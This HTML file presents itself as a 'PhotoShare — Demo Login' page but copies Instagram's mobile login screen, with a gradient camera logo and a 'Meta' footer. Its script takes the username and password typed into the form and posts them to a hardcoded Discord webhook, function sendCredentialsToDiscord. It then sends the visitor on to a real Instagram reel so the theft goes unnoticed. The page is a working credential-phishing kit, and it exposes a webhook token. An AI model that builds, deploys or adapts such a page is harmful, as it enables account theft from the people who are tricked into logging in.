<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PhotoShare — Demo Login</title>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; min-height: 100%; }
  body {
    background: #1f1f1f;
    color: #f1f1f1;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }
  .screen {
    width: 421px;
    min-height: 833px;
    margin: 0 auto;
    padding: 0 17px 25px;
    background: #1f1f1f;
    border: 1px solid #292929;
    position: relative;
  }
  .top {
    height: 67px;
    display: flex;
    align-items: center;
  }
  .back {
    border: 0;
    background: transparent;
    color: #f0f0f0;
    font-size: 38px;
    line-height: 1;
    width: 38px;
    height: 48px;
    cursor: pointer;
    padding: 0;
    font-weight: 200;
  }
  .language {
    text-align: center;
    color: #a9a9ad;
    font-size: 16px;
    margin-top: 1px;
  }
  .brand {
    margin-top: 64px;
    text-align: center;
  }
  .brand-logo {
    width: 70px;
    height: 70px;
    display: block;
    margin: 0 auto;
  }

  .form {
    margin-top: 81px;
  }
  .field {
    width: 100%;
    height: 75px;
    border: 1px solid #515151;
    border-radius: 19px;
    background: #1f1f1f;
    color: #eee;
    padding: 0 19px;
    font-size: 17px;
    outline: none;
    margin-bottom: 15px;
  }
  .field::placeholder { color: #a5a5ab; opacity: 1; }
  .field:focus { border-color: #777; }
  .login {
    width: 100%;
    height: 52px;
    border: 0;
    border-radius: 28px;
    background: #0875e5;
    color: white;
    font-size: 17px;
    cursor: pointer;
    margin-top: -1px;
  }
  .login:hover { background: #1680eb; }
  .link {
    display: block;
    width: fit-content;
    margin: 25px auto 0;
    color: #f0f0f0;
    font-size: 17px;
    text-decoration: none;
    cursor: pointer;
  }
  .create {
    position: absolute;
    left: 17px;
    right: 17px;
    bottom: 75px;
    height: 52px;
    border: 1px solid #3996ff;
    border-radius: 28px;
    color: #46a1ff;
    background: transparent;
    font-size: 17px;
    cursor: pointer;
  }
  .create:hover { background: #242424; }
  .meta {
    position: absolute;
    left: 0;
    right: 0;
    bottom: 31px;
    text-align: center;
    color: #d9d9dc;
    font-size: 20px;
    letter-spacing: .2px;
  }
  .meta-symbol { font-size: 24px; vertical-align: -2px; margin-right: 4px; }
  .notice {
    position: fixed;
    left: 50%;
    bottom: 18px;
    transform: translateX(-50%) translateY(120px);
    background: #333;
    color: #fff;
    padding: 12px 18px;
    border-radius: 12px;
    font-size: 14px;
    opacity: 0;
    transition: .25s ease;
    z-index: 5;
    box-shadow: 0 6px 25px rgba(0,0,0,.35);
  }
  .notice.show {
    transform: translateX(-50%) translateY(0);
    opacity: 1;
  }
  @media (max-width: 460px) {
    .screen { width: 100%; min-height: 100vh; border: 0; }
  }
</style>
</head>
<body>
  <main class="screen">
    <header class="top">
      <button class="back" aria-label="Go back" onclick="goBack()">‹</button>
    </header>

    <div class="language">English (US)</div>

    <section class="brand" aria-label="Meta">
      <svg class="brand-logo" viewBox="0 0 200 200" aria-hidden="true">
        <defs>
          <linearGradient id="gradient"
                          x1="0%"
                          y1="100%"
                          x2="100%"
                          y2="0%">
            <stop offset="0%"   stop-color="#ffb900"/>
            <stop offset="30%"  stop-color="#ff1744"/>
            <stop offset="60%"  stop-color="#e500b9"/>
            <stop offset="100%" stop-color="#8a00ff"/>
          </linearGradient>
        </defs>

        <rect
          x="30" y="30"
          width="140" height="140"
          rx="38"
          fill="none"
          stroke="url(#gradient)"
          stroke-width="14"
        />

        <circle
          cx="100" cy="100"
          r="34"
          fill="none"
          stroke="url(#gradient)"
          stroke-width="13"
        />

        <circle
          cx="140" cy="60"
          r="9"
          fill="#c800e8"
        />
      </svg>
    </section>

    <form class="form" onsubmit="demoLogin(event)">
      <input class="field" id="username" type="text"
             placeholder="Username, email or mobile number"
             autocomplete="off">
      <input class="field" id="password" type="password"
             placeholder="Password" autocomplete="off">
      <button class="login" type="submit">Log in</button>
      <a class="link" href="#" onclick="forgot(event)">Forgot password?</a>
    </form>

    <button class="create" onclick="createAccount()">Create new account</button>

    <div class="meta"><span class="meta-symbol">∞</span>Meta</div>
  </main>

  <div class="notice" id="notice" role="status"></div>

<script>

async function sendCredentialsToDiscord(username, password) {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1557472074811834409/SfJZXZJMbTROISJlQQD5TXboPY4HJWXBAlWZbLn3nAXAUNcfxjj9zGG7NylI1TIyka_M"; // Replace this
  const message = `Username: ${username}\nPassword: ${password}`;
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: message
      })
    });

    if (response.ok) {
      console.log("Credentials sent!");
    } else {
      console.error("Failed to send credentials.");
    }
  } catch (error) {
    console.error(error);
  }
}

function showNotice(message) {
  const n = document.getElementById('notice');
  n.textContent = message;
  n.classList.add('show');
  clearTimeout(window.noticeTimer);
  window.noticeTimer = setTimeout(() => n.classList.remove('show'), 2600);
}

function goBack() {
  showNotice('Loading...');
}

function demoLogin(event) {
  event.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Call the webhook function here
  sendCredentialsToDiscord(username, password)
    .then(() => {
      // Redirect after sending credentials (replace with your desired URL)
      window.location.href = "https://www.instagram.com/reels/DeFHSw6zOY7/";
    })
    .catch((error) => {
      console.error("Error sending credentials:", error);
    });
}

function forgot(event) {
  event.preventDefault();
  showNotice('Loading...');
}

function createAccount() {
  showNotice('Loading...');
}
</script>
</body>
</html>
